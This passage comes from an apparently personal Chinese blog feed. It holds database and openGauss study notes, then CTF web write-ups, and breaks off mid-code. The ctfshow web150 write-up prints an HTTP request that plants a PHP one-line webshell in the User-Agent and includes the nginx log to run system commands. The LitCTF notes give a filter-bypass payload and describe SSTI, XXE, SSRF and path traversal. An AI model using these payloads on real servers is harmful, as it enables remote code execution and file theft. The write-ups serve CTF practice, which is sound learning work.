            "date_published": "2025-09-29T07:25:34.000Z",
            "content_html": "<h3 id=\"数据库\"><a class=\"anchor\" href=\"#数据库\">#</a> 数据库</h3>\n<p>数据库是以一定方式存储在一起的数据集合</p>\n<p>数据库管理系统用于建立维护和使用数据库</p>\n<p>主流数据库可分为关系型和非关系型数据库</p>\n<p>根据部署架构分为集中式和分布式数据库</p>\n<h4 id=\"sql语句分类\"><a class=\"anchor\" href=\"#sql语句分类\">#</a> ⭐sql 语句分类</h4>\n<p>1.DDL 数据定义语言<br />\n 2.DML 数据操纵语言<br />\n 3.DCL 数据控制语言<br />\n 4.DQL 数据查询语言</p>\n<h4 id=\"事务\"><a class=\"anchor\" href=\"#事务\">#</a> ⭐事务</h4>\n<p>1. 原子性<br />\n 2. 一致性<br />\n 3. 隔离性<br />\n 4. 持久性</p>\n<h4 id=\"数据类型\"><a class=\"anchor\" href=\"#数据类型\">#</a> 数据类型</h4>\n<p>字符、整数、浮点 / 任意精度、布尔、日期 / 时间</p>\n<h4 id=\"逻辑结构\"><a class=\"anchor\" href=\"#逻辑结构\">#</a> 逻辑结构</h4>\n<p>1. 表空间<br />\n 2. 数据库<br />\n 3. 数据文件<br />\n 4. 表<br />\n 5. 数据块</p>\n<h4 id=\"基本对象管理\"><a class=\"anchor\" href=\"#基本对象管理\">#</a> 基本对象管理</h4>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">作用</th>\n<th style=\"text-align:center\">代码</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">创建用户</td>\n<td style=\"text-align:center\">CREATE USER</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">修改用户属性</td>\n<td style=\"text-align:center\">ALTER USER</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">删除用户</td>\n<td style=\"text-align:center\">DROP USER</td>\n</tr>\n</tbody>\n</table>\n<p>user-index-table-view<br />\n 用户 - 索引 - 表 - 视图</p>\n<h4 id=\"数据管理\"><a class=\"anchor\" href=\"#数据管理\">#</a> 数据管理</h4>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">作用</th>\n<th style=\"text-align:center\">代码</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">新增数据</td>\n<td style=\"text-align:center\">INSERT INTO ... VALUES(...)</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">修改数据</td>\n<td style=\"text-align:center\">UPDATE ... SET</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">删除数据</td>\n<td style=\"text-align:center\">DELETE ...</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">查询数据</td>\n<td style=\"text-align:center\">SELECT ... FROM ...</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"opengauss\"><a class=\"anchor\" href=\"#opengauss\">#</a> openGauss</h3>\n<h4 id=\"gsql\"><a class=\"anchor\" href=\"#gsql\">#</a> gsql</h4>\n<p>gsql 是在命令行下的数据库连结工具</p>\n<h5 id=\"gsql连结数据库\"><a class=\"anchor\" href=\"#gsql连结数据库\">#</a> gsql 连结数据库</h5>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gsql <span class=\"token parameter variable\">-h</span> master01 <span class=\"token parameter variable\">-p</span> <span class=\"token number\">15400</span> <span class=\"token parameter variable\">-d</span> postgres <span class=\"token parameter variable\">-U</span> gsname <span class=\"token parameter variable\">-W</span> <span class=\"token string\">'gsname@123'</span> <span class=\"token parameter variable\">-r</span></pre></td></tr></table></figure><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">参数</th>\n<th style=\"text-align:center\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">-h</td>\n<td style=\"text-align:center\">数据库所在 ip 地址或主机名</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-p</td>\n<td style=\"text-align:center\">数据库监听端口，默认 5432</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-d</td>\n<td style=\"text-align:center\">创建的数据库名称</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-U</td>\n<td style=\"text-align:center\">创建的用户名</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-W</td>\n<td style=\"text-align:center\">omm 用户密码</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-r</td>\n<td style=\"text-align:center\">开启在客户端操作中可以进行编辑模式</td>\n</tr>\n</tbody>\n</table>\n<p>Trust 安全认证模式 (pg_gba.conf) 仅允许本地登录，远程无法使用该模式登录</p>\n<h5 id=\"元命令\"><a class=\"anchor\" href=\"#元命令\">#</a> 元命令</h5>\n<p>\\l: 列出服务器上所有数据库名称、所有者、字符集编码、以及使用权限</p>\n<p>\\d: 列出所有可用的表空间</p>\n<p>\\c: 连结一个新的数据库</p>\n<p>?: 帮助信息</p>\n<h4 id=\"data-studio\"><a class=\"anchor\" href=\"#data-studio\">#</a> Data Studio</h4>\n<p>图形化工具</p>\n<h4 id=\"约束\"><a class=\"anchor\" href=\"#约束\">#</a> 约束</h4>\n<p>NOT NULL: 不能存储 NULL 值</p>\n<p>UNIQUE: 值唯一</p>\n<p>PRIMARY KEY: 主键</p>\n<p>FOREIGN KEY: 保证表中数据匹配另一个表中值的参照完整性</p>\n<p>CHECK: 保证值符合指定的条件</p>\n<h4 id=\"表连接join\"><a class=\"anchor\" href=\"#表连接join\">#</a> 表连接 JOIN</h4>\n<p>把两个或多个表行结合起来，基于这些表之间的共同字段</p>\n<h4 id=\"union字句\"><a class=\"anchor\" href=\"#union字句\">#</a> union 字句</h4>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> name <span class=\"token keyword\">from</span> table11 <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> name <span class=\"token keyword\">from</span> table2</pre></td></tr></table></figure><p>同时执行两个查寻语句</p>\n<h4 id=\"truncate-table\"><a class=\"anchor\" href=\"#truncate-table\">#</a> TRUNCATE TABLE</h4>\n<p>用于删除表数据，不删除表结构</p>\n<h4 id=\"子查询\"><a class=\"anchor\" href=\"#子查询\">#</a> 子查询</h4>\n<p>在 where 子句中嵌入查询语句，用括号括起来</p>\n<h4 id=\"逻辑运算优先级\"><a class=\"anchor\" href=\"#逻辑运算优先级\">#</a> 逻辑运算优先级</h4>\n<p>NOT&gt;AND&gt;OR</p>\n<h4 id=\"order-by\"><a class=\"anchor\" href=\"#order-by\">#</a> order by</h4>\n<p>升序排序</p>\n<p>desc 降序 asc 升序</p>\n<h4 id=\"去除重复值\"><a class=\"anchor\" href=\"#去除重复值\">#</a> 去除重复值</h4>\n<p>distinct</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token keyword\">distinct</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token keyword\">from</span> table1</pre></td></tr></table></figure><h4 id=\"数据分组\"><a class=\"anchor\" href=\"#数据分组\">#</a> 数据分组</h4>\n<p>group by</p>\n<p>having 条件用在 group by 后</p>\n<h4 id=\"数据限制\"><a class=\"anchor\" href=\"#数据限制\">#</a> 数据限制</h4>\n<p>limit、offset</p>\n<h4 id=\"事务隔离级别\"><a class=\"anchor\" href=\"#事务隔离级别\">#</a> 事务隔离级别</h4>\n<p>脏读<br />\n不可重复读<br />\n幻读</p>\n",
            "tags": [
                "ICT",
                "基础软件训练营3",
                "ICT"
            ]
        },
        {
            "id": "http://m3k0mi.github.io/2025/09/28/%E5%9F%BA%E7%A1%80%E8%BD%AF%E4%BB%B6%E8%AE%AD%E7%BB%83%E8%90%A51/",
            "url": "http://m3k0mi.github.io/2025/09/28/%E5%9F%BA%E7%A1%80%E8%BD%AF%E4%BB%B6%E8%AE%AD%E7%BB%83%E8%90%A51/",
            "title": "基础软件训练营1",
            "date_published": "2025-09-28T08:35:13.000Z",
            "content_html": "<h3 id=\"操作系统的基本组成\"><a class=\"anchor\" href=\"#操作系统的基本组成\">#</a> 操作系统的基本组成</h3>\n<p>1. 系统内核<br />\n 2. 系统调用接口<br />\n 3. 应用程序</p>\n<h3 id=\"用户界面\"><a class=\"anchor\" href=\"#用户界面\">#</a> 用户界面</h3>\n<p>1.cli 文本模式下的指令界面<br />\n 2.Gui 图形界面下的用户界面</p>\n<h3 id=\"unix设计美学\"><a class=\"anchor\" href=\"#unix设计美学\">#</a> UNIX 设计美学</h3>\n<p>1. 小即是美<br />\n 2. 只做一件事，并做到极致<br />\n 3. 连结程序，协作完成复杂功能<br />\n 4. 提供机制，而非策略<br />\n 5. 使用纯文本来存储信息<br />\n 6. 一切皆是文件</p>\n<h3 id=\"openeuler\"><a class=\"anchor\" href=\"#openeuler\">#</a> openEuler</h3>\n<p>是面向数组基础设施的开源操作系统</p>\n<p>1. 多核调度技术<br />\n 2. 软硬件协同<br />\n 3. 轻量级虚拟化<br />\n 4. 智能优化引擎</p>\n<p>rpm 管理软件包</p>\n<p>面向企业的 Linux 发行版</p>\n",
            "tags": [
                "ICT",
                "基础软件训练营3",
                "ICT"
            ]
        },
        {
            "id": "http://m3k0mi.github.io/2024/06/05/%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5-web150/",
            "url": "http://m3k0mi.github.io/2024/06/05/%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5-web150/",
            "title": "日志注入-web150",
            "date_published": "2024-06-05T10:31:46.000Z",
            "content_html": "<h3 id=\"源码\"><a class=\"anchor\" href=\"#源码\">#</a> 源码</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-10-13 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-10-19 07:12:57</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">CTFSHOW</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$vip</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$secret</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">vip</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">secret</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">secret</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">isVIP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">vip</span><span class=\"token operator\">?</span><span class=\"token constant boolean\">TRUE</span><span class=\"token punctuation\">:</span><span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__autoload</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token variable\">$class</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\">#过滤字符</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'QUERY_STRING'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\_| |\\[|\\]|\\?/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token variable\">$ctf</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">class_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$__CTFSHOW__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"class is exists!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$isVIP</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctf</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctf</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这题的一个非预期解就是日志注入</p>\n<h3 id=\"payload\"><a class=\"anchor\" href=\"#payload\">#</a> payload</h3>\n<p>抓包</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/?isVIP=1</span> <span class=\"token http-version property\">HTTP/1.1</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">0f219ad0-725a-48fd-9470-ade9494134c0.challenge.ctf.show</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0 &lt;?php @eval($_POST['1']);?></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Sec-Fetch-Dest</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">document</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Sec-Fetch-Mode</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">navigate</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Sec-Fetch-Site</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">none</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Sec-Fetch-User</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">?1</span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Priority</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">u=1</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Te</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">trailers</span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/x-www-form-urlencoded</span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">45</span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>ctf=/var/log/nginx/access.log&amp;1=system('ls');</pre></td></tr></table></figure><p>通过变量覆盖使 isVIP=1，把一句话木马写在文件头中，然后包含日志文件，连接一句话木马</p>\n",
            "tags": [
                "ctfshow",
                "web150",
                "ctfshow"
            ]
        },
        {
            "id": "http://m3k0mi.github.io/2024/06/01/LitCTF2024-wp/",
            "url": "http://m3k0mi.github.io/2024/06/01/LitCTF2024-wp/",
            "title": "LitCTF2024 wp",
            "date_published": "2024-06-01T03:57:32.000Z",
            "content_html": "<h3 id=\"sas-serializing-authentication-system\"><a class=\"anchor\" href=\"#sas-serializing-authentication-system\">#</a> SAS - Serializing Authentication System</h3>\n<p><img loading=\"lazy\" data-src=\"/images/LitCtf2024/1.png\" alt=\"\" /></p>\n<p>题目提示是一道反序列化题目，并且会将传入的数据 base64 解码</p>\n<p><img loading=\"lazy\" data-src=\"/images/LitCtf2024/2.png\" alt=\"\" /></p>\n<p>payload</p>\n<h3 id=\"一个池子\"><a class=\"anchor\" href=\"#一个池子\">#</a> 一个.... 池子？</h3>\n<p><img loading=\"lazy\" data-src=\"/images/LitCtf2024/3.png\" alt=\"\" /></p>\n<p>看界面是一个回声池，输入什么就输出什么。通过 wappalyzer 发现是用 flask 框架写的，想到 ssti。输入 {7*7} 返回 49，确定存在注入</p>\n<p><img loading=\"lazy\" data-src=\"/images/LitCtf2024/4.png\" alt=\"\" /></p>\n<p>通用 payload 嗦了</p>\n<h3 id=\"百万美元的诱惑\"><a class=\"anchor\" href=\"#百万美元的诱惑\">#</a> 百万美元的诱惑</h3>\n<p><img loading=\"lazy\" data-src=\"/images/LitCtf2024/5.png\" alt=\"\" /></p>\n<p>md5 用 0e 绕，c 用 2025a 绕</p>\n<p><img loading=\"lazy\" data-src=\"/images/LitCtf2024/6.png\" alt=\"\" /></p>\n<p>得到 /dollar.php</p>\n<p><img loading=\"lazy\" data-src=\"/images/LitCtf2024/7.png\" alt=\"\" /></p>\n<p>禁用了字母数字和一堆符号，但是没禁用～$ ()，提示 flag 在 12.php 中</p>\n<p>$(()) 代表做一次运算，因为里面为空，所以值为 0</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">((</span><span class=\"mspace nobreak\"> </span></span></span></span>(()))) 对 0 取反，值为 - 1</p>\n<p>因此 12 个<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">((</span><span class=\"mspace nobreak\"> </span></span></span></span>(()))) 值就为 - 12，再将其放到<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">((</span><span class=\"mspace nobreak\"> </span></span></span></span>(()))) 中取反，就可以得到数字 12</p>\n<p>payload</p>\n<pre><code>?x=$(($((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))))\n</code></pre>\n<h3 id=\"高亮主题划掉背景查看器\"><a class=\"anchor\" href=\"#高亮主题划掉背景查看器\">#</a> 高亮主题 (划掉) 背景查看器</h3>\n<p>抓包发现主题是通过文件包含来实现替换的</p>\n<p><img loading=\"lazy\" data-src=\"/images/LitCtf2024/8.png\" alt=\"\" /></p>\n<p>../ 回到根目录读取 flag 就好了</p>\n<h3 id=\"exx\"><a class=\"anchor\" href=\"#exx\">#</a> exx</h3>\n<p><img loading=\"lazy\" data-src=\"/images/LitCtf2024/9.png\" alt=\"\" /></p>\n<p>这是一个登录界面，题目 exx 是 xxe 反写</p>\n<p><img loading=\"lazy\" data-src=\"/images/LitCtf2024/10.png\" alt=\"\" /></p>\n<p>xxe 注入成功</p>\n<h3 id=\"浏览器也能套娃\"><a class=\"anchor\" href=\"#浏览器也能套娃\">#</a> 浏览器也能套娃？</h3>\n<p><img loading=\"lazy\" data-src=\"/images/LitCtf2024/11.png\" alt=\"\" /></p>\n<p>里面也是一个类似浏览器的界面，猜测是 ssrf，用 file 协议读一下</p>\n<p><img loading=\"lazy\" data-src=\"/images/LitCtf2024/12.png\" alt=\"\" /></p>\n<p>拿到 flag</p>\n",
            "tags": [
                "wp",
                "LitCTF2024",
                "wp"
            ]
        },
        {
            "id": "http://m3k0mi.github.io/2024/05/27/php%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4-web147/",
            "url": "http://m3k0mi.github.io/2024/05/27/php%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4-web147/",
            "title": "php命名空间-web147",
            "date_published": "2024-05-27T10:40:34.000Z",
            "content_html": "<h3 id=\"源码\"><a class=\"anchor\" href=\"#源码\">#</a> 源码</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-10-13 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-10-19 02:04:38</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span 